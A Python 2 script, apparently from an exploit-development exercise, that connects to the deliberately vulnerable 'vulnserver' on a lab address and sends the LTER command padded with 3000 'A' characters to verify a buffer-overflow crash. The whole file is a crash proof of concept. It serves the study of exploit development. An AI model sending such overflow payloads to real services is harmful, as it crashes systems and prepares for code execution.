import socket
import struct
import time
import binascii

print "\nLTER Command - Verify Crash\n"

ip_addr = '192.168.199.130'
port = 9999

# send evil buffer to vulnserver
def send_evil_buffer(evil_buffer):

    did_send = False

    command = evil_buffer[:5]

    print "Sending buffer of length %s to command %s" % (len(evil_buffer), command)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        s.connect((ip_addr, int(port)))

    except Exception as e:
        print "[-] Failed to connect to service %s" % e

    else:
        print "[+] Connected to server"

        # Get banner response
        data = s.recv(1024)
        print(data)

        bytes_sent = s.send(evil_buffer)
        print "Sent %s bytes" % bytes_sent

        if bytes_sent > 0:
            did_send = True

    finally:
        s.close()
 
    return did_send

###############################################################################

# Verify the crash 
evil_buffer = "LTER /.:/" + 'A'*(3000)

send_evil_buffer(evil_buffer)
